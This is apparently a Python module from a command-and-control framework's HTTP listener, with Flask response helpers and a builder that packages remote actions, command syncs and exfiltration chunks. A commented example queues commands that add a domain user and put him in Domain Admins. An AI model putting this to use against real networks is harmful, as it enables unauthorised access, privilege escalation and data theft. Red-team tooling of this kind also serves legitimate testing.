import uuid
import time
from PluginEngine.PublicPlugins.ListenerHTTP.Utils.DataSingleton import Data
from flask import jsonify

class MessageHelper:
    @staticmethod
    def generate_unique_id() -> str:
        return str(uuid.uuid4())

    @staticmethod
    def generate_timestamp() -> int:
        return int(time.time())

def api_request(status: str = "success", data: dict = None, error_message: str = None) -> dict:
    return {
        "rid": MessageHelper.generate_unique_id(),
        "timestamp": MessageHelper.generate_timestamp(),
        "status": status,
        "data": data if data else {},
        "error": {"message": error_message, "aid": [], "rid": None} if error_message else {}
    }

def api_response(status: str = "success", data: dict = None, error_message: str = None, data_items: list = None, **kwargs) -> tuple:
    """
    Helper function to create/construct a response JSON string to send back to the user.

    Args:
        status (str): Status of the response, e.g., "success" or "failure".
        data (dict): Data to be sent back in the response.
        error_message (str): Error message, if any.
        data_items (list): List of tuples (key, value) to add to the data dict.
        **kwargs: Additional keyword arguments to include in the response.

    Returns:
        tuple: A tuple containing the JSON response and the status code.
    """
    data_singleton = Data()

    # Initialize response structure
    response = {
        "rid": MessageHelper.generate_unique_id(),  # Unique identifier for this response
        "timestamp": MessageHelper.generate_timestamp(),  # Current timestamp
        "status": status,
        "data": data if data else {},
        "error": error_message if error_message else {}
    }

    # Add additional data items if provided
    if data_items:
        for key, value in data_items:
            response["data"][key] = value

    # Remove error key if it has no useful content
    if data_singleton.Config.get_value("responses.return_error_message"):
        if not response["error"]:
            del response["error"]

    # Remove data key if it has no useful content
    if not response["data"]:
        del response["data"]

    # Add any additional keyword arguments, excluding None values
    response.update({k: v for k, v in kwargs.items() if v is not None})

    # Return JSON response with appropriate status code
    return jsonify(response), 200

class VesselBuilder:
    def __init__(self):
        self.vessel = {"data": {}}
    
    def add_action(self, client_nickname: str, action: str, executable: str, command: str, aid: str):
        action_entry = {
            "client_nickname": client_nickname,
            "action": action,
            "executable": executable,
            "command": command,
            "aid": aid
        }
        self._add_to_sync_key("Actions", action_entry)
        return self
    
    def add_listener_http_command_sync(self, client_nickname: str, action: str, executable: str, command: str):
        listener_command = {
            "client_nickname": client_nickname,
            "action": action,
            "executable": executable,
            "command": command
        }
        self._add_to_sync_key("ListenerHttpCommandSync", listener_command)
        return self

    def add_client_exfil_sync(self, data: str, chunk: int, size: int, encoding: str, cid: str):
        client_exfil_sync = {
            "data": data,
            "chunk": chunk,
            "size": size,
            "encoding": encoding,
            "cid": cid
        }
        self._add_to_sync_key("ClientExfilSync", client_exfil_sync)
        return self

    #does not have _add_to_sync_key as this should only have one entry.
    def add_client_info(self, nickname: str):
        client_info = {"nickname": nickname}
        self.vessel["data"]["ClientInfo"] = client_info
        return self
    
    def _add_to_sync_key(self, key: str, entry: dict):
        if key not in self.vessel["data"]:
            self.vessel["data"][key] = []
        self.vessel["data"][key].append(entry)
    
    def build(self, status: str = "success", error_message: str = None) -> dict:
        request = api_request(status=status, data=self.vessel["data"], error_message=error_message)
        return request

'''
# Example usage
builder = VesselBuilder()
builder.add_action("clientname", "powershell1", "ps.exe", "net user /domain add bob", "1234")
builder.add_action("clientname", "powershell2", "ps.exe", "net group /add Domain Admins Bob", "1235")
builder.add_listener_http_command_sync("clientname", "powershell1", "ps.exe", "net user /domain add bob")
builder.add_client_exfil_sync("sensitivedata123", 0, 4096, "base64", "uuid-uuid-uuid-uuid")
builder.add_client_info("name")

vessel = builder.build()
print(json.dumps(vessel, indent=2))
'''